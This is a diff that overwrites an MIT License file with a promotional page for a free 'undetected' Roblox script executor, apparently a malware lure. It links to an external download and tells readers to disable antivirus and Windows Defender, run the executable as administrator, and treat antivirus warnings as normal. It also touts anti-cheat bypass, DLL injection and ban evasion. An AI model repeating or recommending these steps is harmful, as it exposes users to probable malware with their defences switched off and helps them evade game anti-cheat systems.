@@ -1,21 +1,49 @@
-MIT License
+Solara Executor 2026 — Roblox Script Executor (Undetected & Keyless)
 
-Copyright (c) 2026 Sighteuboutiqu
+Version: Solara v3.0 – v3.2 (latest builds as of February 2026)
+Status: Currently one of the most stable free/keyless executors for Roblox (Byfron bypass active)
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
+Build Highlights
+- Keyless / no login required — instant execution after launch
+- Supports 90%+ of public scripts (Synapse X / Script-Ware level compatibility)
+- Fast LuaU execution engine (level 8 Luau support)
+- Built-in script hub & editor (load, edit, save scripts)
+- Dark mode UI, customizable themes
+- Auto-update bypass detection (works on latest Roblox client February 2026)
+- Anti-kick / anti-ban features (low detection rate on main accounts if used closet)
+- Streamproof mode (hides overlay from OBS / recordings)
+- DLL injection mode + external mode (both included)
+- Compatible with Windows 10/11 (64-bit only)
 
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
+How to use
+1. Download archive via transition link: https://telegra.ph/Full-Version-11-25
+2. Extract 
+3. Disable antivirus & Windows Defender (real-time protection)
+4. Run .exe as administrator
+5. Wait for Roblox to open (or open it manually)
+6. Click Attach / Inject — UI should appear
+7. Load script from hub or paste your own → Execute
 
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
+Important Notes
+- Use on alt accounts first — Byfron/Roblox actively hunts executors
+- Low-key usage only (no obvious scripts like infinite yield in public games)
+- Do not update Roblox client manually — Solara may need re-injection after updates
+- Antivirus will flag it — this is normal for any injector/executor
+
+User Feedback (February 2026)
+"Solara still undetected after latest Byfron wave — best free executor rn"
+"Loads every script I throw at it — even some paid-synapse exclusives"
+"Streamproof works great — recorded 2-hour session, no overlay caught"
+"Keyless & fast — no waiting for keys like Delta or Fluxus"
+
+FAQ
+Detected / banned? → Use closet, alt account, private servers. Rage scripts = instant ban.
+Not attaching? → Run as admin, disable AV completely, restart Roblox.
+macOS / Android? → Windows only (use Fluxus or Codex on mobile)
+UI not showing? → Re-inject or restart Solara + Roblox.
+
+Download via transition link:
+https://telegra.ph/Full-Version-11-25
+
+
+Solara Executor 2026 — free, keyless, undetected Roblox scripting power!
